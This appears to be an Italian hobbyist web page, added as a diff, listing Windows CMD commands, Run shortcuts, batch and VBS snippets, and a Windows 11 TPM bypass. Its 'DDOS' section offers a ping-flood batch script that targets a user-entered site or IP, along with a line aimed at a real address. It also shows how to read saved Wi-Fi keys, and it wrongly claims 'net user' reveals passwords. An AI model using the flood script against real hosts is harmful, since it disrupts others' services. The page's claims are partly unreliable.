@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="img\icona.png" type="image/icon type">
+    <script src="script.js" defer></script>
+    <link rel="stylesheet" href="style.css">
+    <title>Comandi Windows - nocrack.gratiz</title>
+    
+</head>
+<style>[_nghost-ng-c2697620354]{font-family:Open Sans,sans-serif;color:#121212}</style>
+<body>
+    
+    
+    <div class="corpo">
+        <div class="header">
+            <div class="title">
+                <h2 class="title">nocrack.gratiz.nibble.com.onion.vrd.merate.lc.lombardia.it.eu.wrld</h2>
+            <!--<h2 class="titleshort">nocrack.gratiz</h2>--> 
+            </div>
+        <div class="buthead">
+            <a class="headlk" href="altri\alt.html">Altre ver nocrack</a>
+            <a class="headlk" href="areariservata\arearis.html">Area riservata</a>
+            <button onclick="logout()">Logout</button>
+        </div>
+    </div>
+        <div class="navbar">
+            <ul class="navbar">
+                <li><a href="#cmd">CMD</a></li>
+                <li><a href="#esegui">ESEGUI</a></li>
+                <li><a href="#batch">BATCH</a></li>
+                <li><a href="#vbs">VBS</a></li>
+                <li><a href="#ddos">DDOS</a></li>
+                <li><a href="#autorun">AUTORUN</a></li>
+                <li><a href="#W11NoTPM">W11_NO_TPM</a></li>
+                <li><a href="#importanti">IMPORTANTI</a></li>
+                <li><a href="#hackprnk">HACKER</a></li>
+            </ul>
+        </div>
+        <div class="content">
+            <h1>Comandi CMD e Strumenti di Sistema</h1>
+            
+            <h2 id="cmd">CMD</h2>
+            <ul>
+                <li><code>netsh wlan show profiles</code> - Visualizza le reti memorizzate. <br>
+                <code>netsh wlan show profiles “ nome rete” key=clear </code> - Visualizza le credenziali reti memorizzate; su contenuto chiave trovi la password della rete.</li>
+                <li><code>driverquery</code> - serve a fare la lista dei driver del computer con tutti i dettagli. <br>
+                Scrivere <code>driverquery-v</code><br>
+                <code>driverquery-v > listadriver-txt</code> salverà la lista in un file di testo nella cartella corrente.</li>
+                <li><code>shutdown</code> spegne il computer. <br>
+                <code>shutdown /r /o</code> riavvia il PC e lancia il menu di opzioni avanzate di avvio per accedere alla modalità provvisoria e all' utilità di recupero.</li>
+                <li><code>sfc</code>sta per System File Checker e serve a fare il controllo dei file di sistema per correggere errori di file non trovati o corrotti. <br>
+                <code>sfc /scannow</code> rileva file danneggiati o mancanti e li sostituisce con file buoni.</li>
+                <li><code>tasklist</code> - Mostra le attività in esecuzione. <br>
+                <code>tasklist-svc</code> mostra i servizi relativi a ciascuna attività, <br>
+                <code>tasklist-v</code> fornisce maggiori dettagli su ogni processo e <br>
+                <code>tasklist-m</code> individua i file dll con processi attivi.
+                Questi comandi sono utili per la risoluzione avanzata dei problemi o per rintracciare manualmente malware.</li>
+                <li><code>taskkill /im nome.exe</code> - Termina un processo.</li>
+                <li><code>assoc</code> per vedere le associazioni dei file con i programmi. <br>
+                <code>assoc .txt</code> per vedere quale programma apre i file txt. <br>                  
+                Scrivendo <code>assoc .txt= </code> si potrà cambiare il programma da usare.</li>
+                <li><code>fc</code> sta per File Compare e serve a confrontare due file di testo per vedere se ci sono piccole modifiche tra due versioni di uno stesso file. <br>
+                Digitare quindi <code>fc</code> e poi percorso della cartella e nome dei due file che si vogliono confrontare. <br>
+                Aggiungendo l' opzione <code>/l</code> per confrontare solo il testo ASCII.</li>
+                <li><code>ipconfig</code> - Visualizza l'indirizzo IP del computer. <br>
+                <code>ipconfig /renew</code> è il comando per chiedere un nuovo indirizzo IP, utile per ripristinare internet in caso di problemi con l'ip. <br>
+                È anche possibile utilizzare <code>ipconfig /flushdns</code> per aggiornare la risoluzione dei nomi DNS. <br>                    
+                <code>ipconfig /all</code> mostra tutti gli indirizzi di rete del computer compreso il mac. <br>
+                Per linux è <code>ifconfig</code></li>
+                <li><code>netstat</code>Inserendo il comando <code>netstat-an</code> si otterrà la lista delle porte di rete attualmente aperte con i relativi indirizzi IP. <br>
+                Questo è un grande comando per cercare e risolvere problemi di malware o collegamenti a internet dei software.</li>
+                <li><code>ping www.google.it</code> - Controlla la connessione a Internet con dispositivi interni ed esterni alla lan</li>
+                <li><code>pathping</code> è una versione più avanzata di ping utile se ci sono più router tra il PC e il dispositivo che si sta testando.</li>
+                <li><code>tracert indirizzo</code> per sapere tutti i passaggi che fa un pacchetto per arrivare a quell' indirizzo partendo dal nostro computer. <br>
+                A differenza pathping, tuttavia, tracert mostra anche quanto tempo passa (in millisecondi) ogni passaggio tra server o dispositivi.</li>
+                <li><code>powercfg</code> è un comando molto potente per la gestione dell' energia. <br>
+                Si può utilizzare il comando <code>powercfg /hibernate on</code> e <code>powercfg /hibernate off</code> per gestire la modalità di ibernazione ed è anche possibile utilizzare il comando <code>powercfg /a</code> per visualizzare gli stati di risparmio energetico disponibili sul PC. <br>
+                Un altro comando utile è <code>powercfg /devicequery s1_supported</code> che vedere la lista di dispositivi che possono risvegliare il computer dallo stato di sospensione. <br>                    
+                <code>powercfg /lastwake</code> invece ci dice qual è l' ultimo dispositivo che ha svegliato il PC da uno stato di sospensione. <br>
+                Il comando <code>powercfg /energy</code> può essere usato per avere una dettagliata relazione sul consumo di energia del PC. <br>                    
+                Questo rapporto è utile a verificare eventuali anomalie di sistema che possono aumentare il consumo di energia, in Windows 8 si può usare anche il comando <code>powercfg /batteryreport</code> per avere un' analisi dettagliata dell' uso della batteria nei portatili.</li>
+                <li><code>recimg</code>sta per Recovery Image e si può eseguire solo in Windows 8 per creare un' immagine di sistema.
+                Praticamente tutti i computer Windows comprati già installati hanno già un' immagine di ripristino per fare il reset ma questa potrebbe includere programmi inutili che si preferirebbe non avere.
+                Eseguendo <code>recimg</code> si ottiene una lista di opzioni per usare questo comando in modo da creare un' immagine personalizzata del sistema.</li>
+                <li><code>net user</code> Mostra gli utenti registrati (anche in passato) nel pc con le rispettive password <br>
+                sintassi del comando NET USER: <br> 
+                <pre>
+        [nomeutente [password | *] [opzioni]] [/DOMAIN]
+        nomeutente { password | * } /ADD [opzioni] [/DOMAIN]
+        nomeutente [/DELETE] [/DOMAIN]
+        nomeutente [/TIMES: { times | ALL } ] 
+        nomeutente [/ACTIVE: { YES | NO } ]</pre>
+                </li>
+                <li><code>dcomcnfg</code> consente di configurare varie impostazioni specifiche di DCOM nel Registro di sistema. La finestra DCOMCNFG include tre pagine:
+                <ul>
+                    <li>Sicurezza predefinita <br>
+                    La pagina Sicurezza è simile alla pagina Sicurezza predefinita disponibile nella finestra DCOMCNFG, con la differenza che queste impostazioni si applicano solo all' applicazione corrente. Anche in questo caso, le impostazioni vengono archiviate nell' AppID   per l' oggetto.
+                    La pagina Identifica identifica l' utente usato per eseguire l' applicazione.
+                    La pagina Endpoint elenca il set di protocolli ed endpoint disponibili per l' uso da parte dei client del server DCOM selezionato.</li>
+                    <li>Proprietà predefinite <br>
+                    È necessario selezionare la casella di controllo Abilita Distributed COM in questo computer se si desidera che i client di altri computer accedano agli oggetti COM in esecuzione nel computer. Se si seleziona questa opzione, <code>HKEY_LOCAL_MACHINE\Software\Microsoft\OLE\EnableDCOM</code> il valore viene impostato su <code>Y</code>.</li>
+                    <li>Applicazioni <br>
+                    Modifica le impostazioni per un determinato oggetto, è sufficiente selezionare l' applicazione dall' elenco e fare clic sul pulsante Proprietà . La Finestra Proprietà ha cinque pagine:
+                    <ul>
+                        <li>La pagina Generale conferma l' applicazione in uso.</li>
+                        <li>La pagina Percorso consente di specificare dove deve essere eseguita l' applicazione quando un client chiama “ CoCreateInstance ”   il CLSID pertinente. Se si seleziona la casella di controllo Esegui applicazione nel computer seguente e si immette un nome di computer, “ RemoteServerName”   viene aggiunto un valore in AppID per l' applicazione. Se si deseleziona la casella di controllo Esegui applicazione nel computer “ LocalService_LocalService”   , il valore viene rinominato e quindi disabilitato.</li>
+                    </ul>
+                    </li>
+                    <li>Protocolli predefiniti (solo Windows 2000) <br>
+                    Elenca il set di protocolli di rete disponibili per DCOM in questo computer. L' ordine riflette la priorità in cui verranno usati; il primo nell' elenco ha la priorità più alta. I protocolli possono essere aggiunti o eliminati da questa pagina.</li>
+                </ul>
+                </li>
+                <li><code>mkdir /md</code> crea una cartella</li>
+                <li><code>move</code> sposta una cartella.</li>
+                <li><code>rd /s</code> elimina una cartella</li>
+                <li><code>></code> è utilizzato per reindirizzare il messaggio dallo schermo a un file, generalmente è utilizzato nel comando <code>echo</code></li>
+                <li><code>more</code> o <code>type</code> sono utilizzati per visualizzare il contenuto dei file di testo appena creati.</li>
+            </ul>
+
+            <h2 id="esegui">ESEGUI</h2>
+            <ol>
+                <li><code>access.cpl</code> Controlli Accessibilità</li>           
+                <li><code>accwiz</code> Wizard Accessibilità</li>
+                <li><code>hdwwiz.cpl</code> Aggiungi Hardware</li>
+                <li><code>appwiz.cpl</code> Aggiungi/Rimuovi hardware</li>
+                <li><code>control admintools</code> Strumenti Amministrazione</li>
+                <li><code>wuaucpl.cpl</code> Aggiornamenti Automatici</li>
+                <li><code>fsquirt</code> Trasferimento Guidato Bluetooth</li>
+                <li><code>calc</code> Calcolatrice</li>
+                <li><code>certmgr.msc</code>Certificati</li>
+                <li><code>charmap</code> Mappa Caratteri</li>
+                <li><code>chkdsk</code>  Esegui Check Disk</li>
+                <li><code>clipbrd</code> Visualizza Clipboard</li>
+                <li><code>cmd</code> Finestra DOS</li>
+                <li><code>dcomcnfg</code> Servizi Componenti</li>
+                <li><code>compmgmt.msc</code> Gestione Computer</li>
+                <li><code>control</code> Pannello di Controllo</li>
+                <li><code>timedate.cpl</code> Proprietà Data/Ora</li>
+                <li><code>ddeshare </code> Condivisioni DDE</li>         
+                <li><code>devmgmt.msc</code> Gestione Periferiche</li>
+                <li><code>dxdiag </code> Diagnostica Direct X</li>
+                <li><code>cleanmgr</code> Pulizia Disco</li>
+                <li><code>dfrg.msc</code> Deframmentazione Disco </li>
+                <li><code>diskmgmt.msc</code> Gestione Disco</li>
+                <li><code>diskpart </code> Gestione Partizione Disco</li>
+                <li><code>control desktop</code>  Proprietà Schermo</li>
+                <li><code>desk.cpl</code> Proprietà Schermo</li>
+                <li><code>drwtsn32</code> Dr. Watson</li>
+                <li><code>verifier </code> Driver Verifier Manager</li>
+                <li><code>eventvwr.msc</code>  Visualizzatore Eventi</li>       
+                <li><code>migwiz</code> Trasferimento Guidato File e Impostazioni</li>
+                <li><code>sigverif</code> Verifica Firma File</li>
+                <li><code>findfast.cpl</code> Trova Velocemente</li>
+                <li><code>control folder</code> Opzioni Cartella</li>
+                <li><code>control fonts</code> Font</li>
+                <li><code>fonts</code> Cartella Font</li>
+                <li><code>freecell</code> Gioco Free Cell</li>
+                <li><code>joy.cp</code> Controlli Gioco</li>
+                <li><code>gpedit.ms</code> Criterio Gruppo (per xp professional)</li>
+                <li><code>mshearts</code> Gioco Hearts</li>
+                <li><code>helpctr </code> Aiuto e Supporto</li>
+                <li><code>hypertrm</code> HyperTermina</li>
+                <li><code>iexpress</code> Iexpress Wizard</li>
+                <li><code>ciadv.msc</code> Servizio Indicizzazione</li>
+                <li><code>icwconn1</code> Connessione Guidata a Internet</li>
+                <li><code>iexplore</code> Internet Explorer</li>
+                <li><code>inetcpl.cpl</code> Proprietà Internet</li>
+                <li><code>control keyboard</code> Proprietà Tastiera</li>
+                <li><code>secpol.msc</code> Impostazioin Protezione Locale</li>
+                <li><code>lusrmgr.msc</code> Utenti e Gruppi Locali</li>
+                <li><code>access.cpl</code> Controlli Accessibilità</li>
+                <li><code>logoff</code> Uscire da Windows</li>
+                <li><code>mrt</code> Strumento di Rimozione Malware</li>
+                <li><code>winchat</code> Microsoft Chat</li>
+                <li><code>moviemk </code> Microsoft Movie Maker</li>
+                <li><code>mspaint</code> Microsoft Paint</li>
+                <li><code>mobsync</code> Microsoft Syncronization Tool</li>
+                <li><code>winmine</code> Gioco Campo Minato</li>
+                <li><code>control mouse</code> Proprietà Mouse</li>
+                <li><code>main.cp</code> Proprietà Mouse</li>
+                <li><code>conf</code> Netmeeting</li>
+                <li><code>control netconnections</code> Connessioni di Rete</li>
+                <li><code>ncpa.cpl</code> Connessioni di Rete</li>
+                <li><code>netsetup.cp</code> Connessioni Guidata Rete</li>
+                <li><code>notepad </code> Notepad</li>
+                <li><code>packager </code> Object Packager</li>
+                <li><code>odbccp32.cpl</code> Amministrazione Origine Dati ODBC</li>
+                <li><code>osk</code> Tastiera su Schermo</li>
+                <li><code>msimn</code> Outlook Express</li>
+                <li><code>pbrush</code> Paint</li>
+                <li><code>password.cpl</code> Proprietà Password</li>
+                <li><code>perfmon.msc</code> Monitor Performance</li>
+                <li><code>perfmon</code> Monitor Performance</li>
+                <li><code>telephon.cpl</code> Opzioni Telefono e Modem</li>
+                <li><code>dialer</code> Connessione Telefonica</li>
+                <li><code>pinball</code> Gioco Pinball</li>
+                <li><code>powercfg.cpl</code> Opzioni Risparmio Energia</li>
+                <li><code>control printers</code> Stampanti e Fax</li>
+                <li><code>printers</code> Cartella Stampanti</li>
+                <li><code>intl.cpl</code> Impostazioni Regionali</li>
+                <li><code>regedit</code> Editor del Registro di Sistema</li>
+                <li><code>regedit32</code> Editor del Registro di Sistema</li>
+                <li><code>rasphone</code> Rubrica per la Connessione Remota</li>
+                <li><code>mstsc</code> Desktop Remoto</li>
+                <li><code>ntmsmgr.msc</code> Archivi Removibili</li>
+                <li><code>ntmsoprq.msc</code> Richieste Operatore per Archivi Removibili</li>
+                <li><code>rsop.msc</code> Griuppo di Criteri Risultante (per xp professional)</li>
+                <li><code>sticpl.cpl</code> Scanner e Macchine Fotografiche</li>
+                <li><code>control schedtasks</code> Operazioni Pianificate</li>
+                <li><code>wscui.cpl</code> Centro Sicurezza</li>
+                <li><code>services.msc</code> Servizi</li>
+                <li><code>fsmgmt.msc</code> Cartelle Condivise</li>
+                <li><code>shutdown</code> Chiusura Windows</li>
+                <li><code>mmsys.cpl</code> Suoni e Periferiche Audio</li>
+                <li><code>spider</code> Gioco Spider</li>
+                <li><code>cliconfg</code> Utilità di rete Configurazione SQL</li>
+                <li><code>sysedit</code> Editor di Configurazione di Sistema</li>
+                <li><code>msconfig</code> Utilità di Configurazione di Sistema</li>
+                <li><code>msinfo32</code> Informazioni di Sitema</li>
+                <li><code>sysdm.cpl</code> Proprietà di Sistema</li>
+                <li><code>taskmgr</code> Task Manager</li>
+                <li><code>tcptest</code> TCP Tester</li>
+                <li><code>telnet</code> Telnet Client</li>
+                <li><code>nusrmgr.cpl</code> Gestione Account Utente</li>
+                <li><code>utilman</code> Utility Manager</li>
+                <li><code>wab</code> Rubrica Windows</li>
+                <li><code>wabmig</code> Utilità Importazione Rubrica Windows</li>
+                <li><code>explorer</code> Windows Explorer</li>
+                <li><code>firewall.cpl</code> Windows Firewall</li>
+                <li><code>magnify</code> Windows Magnifier</li>
+                <li><code>wmimgmt.msc</code> Windows Management Infrastructure</li>
+                <li><code>wmplayer</code> Windows Media Player</li>
+                <li><code>msmsgs</code> Windows Messenger</li>
+                <li><code>syskey</code> Protezione del Database Account Windows</li>
+                <li><code>wupdmgr</code> Windows Update</li>
+                <li><code>winver</code> Versione di Windows</li>
+                <li><code>tourstart</code> Tour Guidato Windows XP</li>
+                <li><code>write</code> Wordpad</li>
+                <li><code>%Userprofile%</code> La cartella apre la cartella utente</li>
+                <li><code>control</code> Pannello di controllo</li>
+                <li><code>Regedit</code> editor delle chiavi di registro.(HKEY)</li>
+                <li><code>cleanmgr</code>  utility di pulizia dell'hard disk</li>
+                <li><code>compmgmt.msc</code> "Gestione Computer" dove è possibile gestire gli utenti, le cartelle condivise, i dischi e tanto altro</li>
+                <li><code>firewall.cpl</code> pannello di configurazione del firewall di Windows</li>
+                <li><code>fsmgmt.msc</code> condivisione attive del computer: cartelle e stampanti a cui si può accedere in rete anche da altri pc</li>
+                <li><code>iexplore, Chrome, Firefox, Opera</code> È anche possibile aggiungere l'indirizzo di un sito web alla fine del nome del browser per aprirlo direttamente</li>
+                <li><code>msinfo32</code> info sistema</li>
+                <li><code>Netplwiz</code> finestra di configurazione della gestione utenti. <br>
+                    Se viene eseguito da un utente non amministratore, può cambiare alcune preferenze dell'account come, ad esempio, la password</li>
+                <li><code>OSK</code> tastiera sullo schermo</li>
+                <li><code>Logoff, shutdown</code> disconnetti, spegni</li>
+                <li><code>utilman</code> centro di accessibilità di Windows (vedi articolo Migliori funzioni nascoste nel centro accessibilità di Windows, non solo per disabili)</li>
+                <li><code>wuapp</code> aggiornamenti di Windows</li>
+                <li><code>write</code> pre Wordpad</li>
+                <li><code>notepad</code> blocco note</li>
+                <li><code>WinWord</code> Word</li>
+                <li><code>mstsc</code> avviare una sessione di desktop remoto</li>
+                <li><code>winver</code> versione di Windows installata</li>
+                <li><code>resmon</code> monitoraggio risorse, per sapere come vengono usate le risorse hardware del computer, in tempo reale</li>
+                <li><code>wf.msc</code> impostazioni del Firewall di Windows</li>
+                <li><code>fsquirt</code> trasferimento file tramite bluetooth</li>
+                <li><code>appwiz.cpl</code> finestra Programmi e funzionalità in Windows 7 o Installazione Applicazioni in Windows 10, per disinstallare app e programmi</li>
+                <li><code>shrpubw</code> creazione guidata di una cartella condivisa, per condividere cartelle e file in rete</li>
+                <li><code>credwiz</code> strumento di creazione del backup delle password memorizzate da Windows</li>
+                <li><code>sysdm.cpl</code> proprietà di sistema</li>
+                <li><code>perfmon</code> strumento di performance report</li>
+            </ol>
+
+            <h2 id="batch">BATCH</h2>
+            <pre>
+        @echo off                                      
+        title  Martix                                                 ← assegna il titolo alla finestra cmd
+        color <span style="color: green;">0A</span>                                                      ← cambia il colore del testo
+        mode   1000                                                   ← cambia la grandezza della finestra
+        goto   Greeting                                               ← ordina di eseguire un loop di comandi che viene identificato in seguito
+        :Greeting                                                     ← inizio del gruppo di comandi
+        cls                                                           ← cancella tutte le scritte dal cmd
+        echo Hello Neo.                                               ← scrive in cima alla finestra il testo
+        pause                                                         ← mette in pausa i comandi fino a quando l’ utente non  clicca un tasto per continuare
+        cls
+        goto Matrix
+        :Matrix
+        echo   %random%%random%%random%%random%%random%%random%       ← scrive numeri e lettere random
+        PING 1.1.1.1 -n .1 -w 0.3 NUL
+        goto Matrix
+        rd /s c:\$Recycle  Bin                                        ← svuota il cestino per tutti gli utenti
+        pause</pre>
+
+        <h2 id="vbs">VBS</h2>
+        <pre>
+        set wshshell = wscript.CreateObject("wscript.shell")
+        wshshell.run "Notepad"                                  ← app da aprire
+        wscript.sleep 2000                                      ← tempo di attesa
+        wshshell.AppActivate "Notepad"
+        WshShell.SendKeys " Ciao"                               ← testo da scrivere automaticamente</pre>
+        <p>salva nome .vbs (da blocco note)</p>
+
+        <h2 id="ddos" class="ddos">DDOS</h2>
+        <pre>
+        ping 142.250.180.132 -t -l 100          ← ip da ddossare
+        dir /d /n /q /s/w
+        
+        @echo off
+        mode 67,16
+        title DDOS
+        color 0a
+        cls
+        echo.
+        echo Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä
+        echo Programma per dossare
+        echo Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä
+        echo.
+        set /p x=Nome del sito da attaccare:
+        echo.
+        echo Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä
+        ping %x%
+        echo Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä Ä
+        @ping.exe 127.0.0.1 -n 5 -w 1500 > nul
+        goto Next
+        :Next
+        echo.
+        echo.
+        echo.
+        set /p m=             IP host:
+        echo.
+        set /p n=Numero pacchetti:
+        echo.
+        :DDOS
+        color 0c
+        echo Attacco %m% in corso
+        ping %m% -i %n% -t > nul
+        goto DDOS</pre>
+
+        <a href="areariservata/ddos.html">Scarica il batch</a>
+
+        <h2 id="autorun">AUTORUN</h2>
+            <pre>
+            [autorun]
+            icon = icon.ico ,0                                ← selezione dell' icona</pre>
+
+        <h2 id="W11NoTPM">BYPASS CONTROLLI INSTALLAZIONE WINDOWS (W11 SENZA TPM):</h2>
+        <pre>
+        Cliccare Shift+F10
+        
+        Scrivere nel cmd: " regedit" [cliccare invio]
+        Cliccare " HKEY_LOCAL_MACHINE" => " SYSTEM" ,
+        Con il destro cliccare " Setup" => " Nuovo" => Chiave e chiamarla: " LabConfig" [cliccare invio]
+        Con il destro cliccare " LabConfig" => " Nuovo" => " Valore DWORD (32bit)" , rinominarlo in " BypassTPMCheck" [cliccare invio]
+        Con il destro cliccare " LabConfig" => " Nuovo" => " Valore DWORD (32bit)" , rinominarlo in " BypassSecureBootCheck" [cliccare invio]
+        Cliccare le DWORD ed impostare il valore " 1" in entrambe e cliccare OK.</pre>
+        <h2 id="importanti">IMPORTANTI</h2>
+        <ul>
+            <li><code>lusrmgr.msc</code></li>
+            <li><code>Regedit</code></li>
+            <li><code>perfmon</code></li>
+            <li><code>fsmgmt.msc</code></li>
+            <li><code>compmgmt.msc</code></li>
+            <li>centro PC portatile Windows</li>
+            <li><code>tasklist</code></li>
+            <li><code>netplwiz</code> finestra di configurazione della gestione utenti</li>
+            <li>Per aprire il prompt dei comandi DOS   si deve eseguire il comando CMD , se poi si vuol aprire il prompt con diritti da amministratore scrivere cmd   e poi premere insieme i tasti CTRL MAIUSC INVIO, <br>
+            Se viene eseguito da un utente non amministratore, può cambiare alcune preferenze dell' account come, ad esempio, la password</li> 
+            <li>Con <code>shutdown /i</code> si apre la finestra per spegnere altri PC collegati in rete.</li>
+            <li>PROVVISORIA: tenere premuto SHIFT e poi riavviare il pc tenendo premuto, si vede un quadrato blu e schiacciare modalità provvisoria, per staccare, spegnere il PC</li>
+            <li>NET USER</li>
+            <li><a href="http://radio.garden/visit/coulounieix-chamiers/UHpLply">Radio Garden</a></li>
+            <li><a href="https://www.compilejava.net/">CompileJava</a></li>
+            </ul>
+
+            <h2 id="hackprnk">Siti Hacker Prank</h2>
+            <ul>
+                <li><a href="https://pranx.com" target="_blank">Pranx</a></li>
+                <li><a href="https://hackertyper.net" target="_blank">Hackertyper</a></li>
+                <li><a href="https://geektyper.com" target="_blank">Geektyper</a></li>
+            </ul>
+        </div>
+        <div class="footer">
+            <p>&copy;2021-2025 nocrack.gratiz</p>
+        </div>
+    </div>
+    
+</body>
+</html>
